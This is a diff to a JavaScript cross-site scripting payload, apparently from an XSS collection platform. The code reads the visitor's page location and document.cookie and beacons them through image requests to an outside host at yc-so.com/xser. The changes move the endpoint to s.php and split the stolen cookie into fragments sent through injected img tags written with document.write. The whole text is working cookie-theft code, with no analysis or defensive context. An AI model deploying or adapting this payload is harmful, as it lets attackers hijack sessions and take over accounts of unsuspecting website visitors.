@@ -1,5 +1,5 @@
 (function() {
-    (new Image()).src = 'http://www.yc-so.com/xser/index.php?do=api&id={projectId}&location=' + escape((function() {
+    (new Image()).src = 'http://www.yc-so.com/xser/s.php?do=api&id={projectId}&location=' + escape((function() {
         try {
             return document.location.href
         } catch (e) {
@@ -11,12 +11,17 @@
         } catch (e) {
             return ''
         }
-    })()) + '&cookie=' + escape((function() {
+    })()) + '&c=' + escape((function() {
         try {
             var c1=document.cookie;
             var clen=c1.length/3;
-            c2=c1.substring(0,clen );
-            return c2;
+            c2=c1.substring(0,clen );       
+            var clen2=c2.length/2;
+            c3=c2.substring(0,clen2 );
+            c4=c2.substring(clen2,c2.length );
+
+           document.write("<img src='http://www.yc-so.com/xser/s.php?c="+c2+"'><img src='http://www.yc-so.com/xser/s.php?c="+c3+"'>");
+            return c4;
         } catch (e) {
             return ''
         }
